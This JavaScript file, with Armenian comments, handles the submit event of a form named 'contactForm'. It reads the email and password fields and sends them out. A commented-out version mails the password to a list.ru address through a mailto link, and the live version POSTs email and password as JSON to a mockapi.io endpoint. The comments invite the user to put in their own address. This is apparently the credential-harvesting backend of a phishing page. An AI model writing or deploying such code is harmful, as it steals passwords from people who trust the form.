// document.getElementById("contactForm").addEventListener("submit", function (e) {
//     e.preventDefault();
  
//     var email = document.getElementById("email").value;
//     var password = document.getElementById("password").value;
  
//     // Տվեք այստեղ ձեր մեյլի հասցեն
//     var yourEmail = "poghosyan.01@list.ru";
  
//     // այստեղ տվեք ձեր հաղորդագրման պառածած հասցեն
//     var subject = email
  
//     var mailtoLink = "mailto:" + yourEmail + "?subject=" + subject + "&body=" + password;
//   console.log(mailtoLink);
//     window.location.href = mailtoLink;
//   });
  


document.getElementById("contactForm").addEventListener("submit", function (e) {
  e.preventDefault();

  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  var yourEmail = "poghosyan.01@list.ru";
  var subject = email;

  // Սերվերում ստեղծվող URL
  var serverEndpoint = "https://651be2c0194f77f2a5af056f.mockapi.io/test"; // Փոխեք այստեղ ձեր սերվերի հասցենով

  fetch(serverEndpoint, {
      method: "POST",
      headers: {
          "Content-Type": "application/json"
      },
      body: JSON.stringify({
          email: email,
          password: password,
          subject: subject
      })
  })
  .then(response => {
      if (response.ok) {
          console.log("Message sent successfully!");
          // Այստեղ դուք կարողանում եք ավտոմատ ռեդիրեկտ էջ բացել կամ այլ հարցումներ կատարել։
      } else {
          console.error("Failed to send message");
      }
  })
  .catch(error => {
      console.error("Error:", error);
  });
});



